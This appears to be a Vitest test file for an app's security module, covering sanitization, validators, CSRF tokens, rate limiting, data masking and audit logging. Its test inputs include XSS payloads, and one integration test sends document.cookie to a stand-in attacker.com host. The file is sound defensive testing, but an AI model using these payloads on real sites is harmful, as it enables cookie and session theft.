import { describe, it, expect, beforeEach } from 'vitest';
import {
  sanitizeInput,
  sanitizeObject,
  validators,
  ClientRateLimiter,
  tokenStore,
  generateCSRFToken,
  validateCSRFToken,
  getCSRFToken,
  maskSensitiveData,
  AuditLogger,
} from '../src/stores/security';

/**
 * Security Testing Suite for App Manager
 * Comprehensive tests for XSS prevention, input validation, CSRF protection
 */

describe('Security Hardening Tests', () => {
  describe('Input Sanitization', () => {
    it('should prevent XSS through script injection', () => {
      const malicious = '<script>alert("XSS")</script>';
      const sanitized = sanitizeInput(malicious);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('</script>');
    });

    it('should prevent event handler injection', () => {
      const malicious = '<img src=x onerror="alert(1)">';
      const sanitized = sanitizeInput(malicious);
      expect(sanitized).not.toContain('onerror');
    });

    it('should prevent javascript: protocol', () => {
      const malicious = '<a href="javascript:alert(1)">Click</a>';
      const sanitized = sanitizeInput(malicious);
      expect(sanitized).not.toContain('javascript:');
    });

    it('should remove dangerous HTML tags', () => {
      const malicious = '<iframe src="evil.com"></iframe>';
      const sanitized = sanitizeInput(malicious);
      expect(sanitized).not.toContain('<iframe');
    });

    it('should prevent embed tag injection', () => {
      const malicious = '<embed src="malicious.swf">';
      const sanitized = sanitizeInput(malicious);
      expect(sanitized).not.toContain('<embed');
    });

    it('should handle multiple sanitization passes', () => {
      const malicious = '<ScRiPt>alert(1)</sCrIpT>';
      const sanitized = sanitizeInput(malicious);
      expect(sanitized.toLowerCase()).not.toContain('script');
    });

    it('should preserve safe content', () => {
      const safe = 'This is a normal app description with spaces and numbers 123';
      const sanitized = sanitizeInput(safe);
      expect(sanitized).toBe(safe);
    });

    it('should sanitize object properties', () => {
      const obj = {
        name: '<script>alert(1)</script>App',
        description: 'Normal text',
        html: '<div onclick="evil()">Content</div>',
      };

      const sanitized = sanitizeObject(obj);
      expect(sanitized.name).not.toContain('<script>');
      expect(sanitized.html).not.toContain('onclick');
      expect(sanitized.description).toBe('Normal text');
    });

    it('should sanitize nested arrays and objects', () => {
      const complex = {
        items: [
          { text: '<img src=x onerror=alert(1)>' },
          { text: 'Normal' },
        ],
        nested: {
          code: '<script>evil()</script>',
        },
      };

      const sanitized = sanitizeObject(complex);
      expect(sanitized.items[0].text).not.toContain('onerror');
      expect(sanitized.nested.code).not.toContain('<script>');
    });
  });

  describe('Input Validation', () => {
    it('should validate email addresses correctly', () => {
      expect(validators.email('test@example.com')).toBe(true);
      expect(validators.email('invalid.email')).toBe(false);
      expect(validators.email('test@')).toBe(false);
      expect(validators.email('@example.com')).toBe(false);
    });

    it('should enforce strong password requirements', () => {
      expect(validators.password('Weak1!')).toBe(false); // Too short
      expect(validators.password('NoNumber!')).toBe(false); // Missing number
      expect(validators.password('noupperscase1!')).toBe(false); // Missing uppercase
      expect(validators.password('NOLOWERCASE1!')).toBe(false); // Missing lowercase
      expect(validators.password('NoSpecial1')).toBe(false); // Missing special char
      expect(validators.password('ValidPass123!')).toBe(true);
    });

    it('should validate usernames', () => {
      expect(validators.username('valid_user')).toBe(true);
      expect(validators.username('user-123')).toBe(true);
      expect(validators.username('ab')).toBe(false); // Too short
      expect(validators.username('user@name')).toBe(false); // Invalid char
      expect(validators.username('a'.repeat(21))).toBe(false); // Too long
    });

    it('should validate UUIDs', () => {
      const validUuid = '550e8400-e29b-41d4-a716-446655440000';
      expect(validators.uuid(validUuid)).toBe(true);
      expect(validators.uuid('not-a-uuid')).toBe(false);
      expect(validators.uuid('550e8400-e29b-41d4-a716')).toBe(false);
    });

    it('should validate URLs', () => {
      expect(validators.url('https://example.com')).toBe(true);
      expect(validators.url('http://localhost:8080')).toBe(true);
      expect(validators.url('not a url')).toBe(false);
      expect(validators.url('javascript:alert(1)')).toBe(false);
    });

    it('should validate alphanumeric strings', () => {
      expect(validators.alphanumeric('abc123')).toBe(true);
      expect(validators.alphanumeric('ABC')).toBe(true);
      expect(validators.alphanumeric('123')).toBe(true);
      expect(validators.alphanumeric('abc-123')).toBe(false);
      expect(validators.alphanumeric('abc 123')).toBe(false);
    });

    it('should detect NoSQL injection patterns', () => {
      expect(validators.noSql('normal_input')).toBe(true);
      expect(validators.noSql('{ $gt: "" }')).toBe(false);
      expect(validators.noSql('function(){}')).toBe(false);
      expect(validators.noSql('constructor')).toBe(false);
    });
  });

  describe('CSRF Protection', () => {
    beforeEach(() => {
      localStorage.clear();
    });

    it('should generate unique CSRF tokens', () => {
      const token1 = generateCSRFToken();
      const token2 = generateCSRFToken();

      expect(token1).toBeTruthy();
      expect(token2).toBeTruthy();
      expect(token1.length).toBe(64); // 32 bytes hex
      // Tokens should be different (extremely likely)
      expect(token1).not.toBe(token2);
    });

    it('should validate CSRF tokens correctly', () => {
      const token = generateCSRFToken();
      expect(validateCSRFToken(token)).toBe(true);
    });

    it('should reject invalid CSRF tokens', () => {
      generateCSRFToken();
      expect(validateCSRFToken('invalid_token')).toBe(false);
    });

    it('should retrieve stored CSRF token', () => {
      const generated = generateCSRFToken();
      const retrieved = getCSRFToken();
      expect(generated).toBe(retrieved);
    });

    it('should persist CSRF token across sessions', () => {
      const token = generateCSRFToken();
      const persisted = localStorage.getItem('csrf_token');
      expect(persisted).toBe(token);
    });
  });

  describe('Token Storage', () => {
    beforeEach(() => {
      tokenStore.clearAll();
    });

    it('should store and retrieve tokens', () => {
      tokenStore.setToken('auth', 'abc123xyz');
      expect(tokenStore.getToken('auth')).toBe('abc123xyz');
    });

    it('should expire tokens after timeout', async () => {
      // Create a token store with short expiration for testing
      const store = {
        store: new Map(),
        setToken(key, value, expiresIn = 100) {
          this.store.set(key, {
            value,
            timestamp: Date.now(),
            expiresIn,
          });
        },
        getToken(key) {
          const entry = this.store.get(key);
          if (!entry) return null;
          if (Date.now() - entry.timestamp > entry.expiresIn) {
            this.store.delete(key);
            return null;
          }
          return entry.value;
        },
      };

      store.setToken('test', 'value', 50);
      expect(store.getToken('test')).toBe('value');

      // Wait for expiration
      await new Promise(resolve => setTimeout(resolve, 100));
      expect(store.getToken('test')).toBeNull();
    });

    it('should clear specific tokens', () => {
      tokenStore.setToken('token1', 'value1');
      tokenStore.setToken('token2', 'value2');

      tokenStore.clearToken('token1');
      expect(tokenStore.getToken('token1')).toBeNull();
      expect(tokenStore.getToken('token2')).toBe('value2');
    });

    it('should clear all tokens', () => {
      tokenStore.setToken('token1', 'value1');
      tokenStore.setToken('token2', 'value2');

      tokenStore.clearAll();
      expect(tokenStore.getToken('token1')).toBeNull();
      expect(tokenStore.getToken('token2')).toBeNull();
    });
  });

  describe('Rate Limiting', () => {
    it('should allow requests within limit', () => {
      const limiter = new ClientRateLimiter(10, 1000);

      for (let i = 0; i < 10; i++) {
        expect(limiter.isAllowed()).toBe(true);
      }
    });

    it('should block requests exceeding limit', () => {
      const limiter = new ClientRateLimiter(5, 1000);

      for (let i = 0; i < 5; i++) {
        expect(limiter.isAllowed()).toBe(true);
      }

      expect(limiter.isAllowed()).toBe(false);
      expect(limiter.isAllowed()).toBe(false);
    });

    it('should track remaining requests', () => {
      const limiter = new ClientRateLimiter(5, 1000);

      for (let i = 0; i < 3; i++) {
        limiter.isAllowed();
      }

      expect(limiter.getRemainingRequests()).toBe(2);
    });

    it('should reset after window expires', async () => {
      const limiter = new ClientRateLimiter(3, 50);

      limiter.isAllowed();
      limiter.isAllowed();
      limiter.isAllowed();
      expect(limiter.isAllowed()).toBe(false);

      await new Promise(resolve => setTimeout(resolve, 100));
      expect(limiter.isAllowed()).toBe(true);
    });

    it('should reset counter manually', () => {
      const limiter = new ClientRateLimiter(3, 1000);

      limiter.isAllowed();
      limiter.isAllowed();
      limiter.isAllowed();
      expect(limiter.isAllowed()).toBe(false);

      limiter.reset();
      expect(limiter.isAllowed()).toBe(true);
    });
  });

  describe('Sensitive Data Masking', () => {
    it('should mask password fields', () => {
      const data = { password: 'MySecurePassword123!' };
      const masked = maskSensitiveData(data);

      expect(masked.password).not.toBe(data.password);
      expect(masked.password).toMatch(/^My\*+23!$/);
    });

    it('should mask token fields', () => {
      const data = { token: 'abc123def456ghi789' };
      const masked = maskSensitiveData(data);

      expect(masked.token).not.toContain('123def456');
      expect(masked.token).toMatch(/^ab\*+89$/);
    });

    it('should mask custom fields', () => {
      const data = { creditCard: '4111111111111111' };
      const masked = maskSensitiveData(data, ['creditCard']);

      expect(masked.creditCard).not.toContain('111111');
      expect(masked.creditCard).toMatch(/^41\*+11$/);
    });

    it('should preserve non-sensitive fields', () => {
      const data = {
        username: 'john_doe',
        email: 'john@example.com',
        password: 'Secret123!',
      };
      const masked = maskSensitiveData(data);

      expect(masked.username).toBe('john_doe');
      expect(masked.email).toBe('john@example.com');
      expect(masked.password).not.toBe('Secret123!');
    });
  });

  describe('Audit Logging', () => {
    beforeEach(() => {
      const logger = new AuditLogger();
      logger.clear();
    });

    it('should log security events', () => {
      const logger = new AuditLogger();

      logger.log('login_attempt', { userId: 'user123' }, 'info');
      logger.log('failed_auth', { reason: 'invalid_password' }, 'warning');

      const logs = logger.getLogs();
      expect(logs.length).toBe(2);
      expect(logs[0].action).toBe('login_attempt');
      expect(logs[1].severity).toBe('warning');
    });

    it('should mask sensitive data in logs', () => {
      const logger = new AuditLogger();

      logger.log('auth_attempt', { password: 'MyPassword123!' }, 'info');

      const logs = logger.getLogs();
      expect(logs[0].details.password).not.toBe('MyPassword123!');
      expect(logs[0].details.password).toMatch(/\*/);
    });

    it('should filter logs by severity', () => {
      const logger = new AuditLogger();

      logger.log('event1', {}, 'info');
      logger.log('event2', {}, 'error');
      logger.log('event3', {}, 'error');
      logger.log('event4', {}, 'warning');

      const errors = logger.getLogsBySeverity('error');
      expect(errors.length).toBe(2);
    });

    it('should limit log history', () => {
      const logger = new AuditLogger();

      for (let i = 0; i < 1500; i++) {
        logger.log(`event_${i}`, {}, 'info');
      }

      expect(logger.getLogs().length).toBe(1000);
    });

    it('should clear all logs', () => {
      const logger = new AuditLogger();

      logger.log('event1', {}, 'info');
      logger.log('event2', {}, 'info');

      logger.clear();
      expect(logger.getLogs().length).toBe(0);
    });
  });

  describe('Security Integration', () => {
    it('should validate and sanitize user input together', () => {
      const input = '<script>alert(1)</script>test@example.com';

      const sanitized = sanitizeInput(input);
      // Sanitize removes script tags
      expect(sanitized).not.toContain('<script>');

      // Validate email portion
      expect(validators.email(sanitized)).toBe(false); // Now invalid due to remaining chars
    });

    it('should prevent common attack patterns', () => {
      const attacks = [
        '<img src=x onerror="fetch(\'http://attacker.com?data=\'+document.cookie)">', // Cookie theft
        '"><script>fetch(\'http://attacker.com/steal\')</script>', // Script injection
        'admin" or "1"="1', // SQL-like injection
        '${process.env.SECRET}', // Template injection
      ];

      for (const attack of attacks) {
        const sanitized = sanitizeInput(attack);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('${');
      }
    });

    it('should maintain security across full workflow', () => {
      // Generate CSRF token
      const csrfToken = generateCSRFToken();
      expect(validateCSRFToken(csrfToken)).toBe(true);

      // Validate and sanitize user input
      const userInput = {
        username: '<script>alert(1)</script>user123',
        password: 'SecurePass123!',
      };

      const sanitized = sanitizeObject(userInput);
      expect(sanitized.username).not.toContain('<script>');
      expect(validators.password(sanitized.password)).toBe(true);

      // Log the action
      const logger = new AuditLogger();
      logger.log('user_registration', sanitized, 'info');

      const logs = logger.getLogs();
      expect(logs[0].action).toBe('user_registration');
      // Ensure password is masked in logs
      expect(logs[0].details.password).toMatch(/\*/);
    });
  });
});
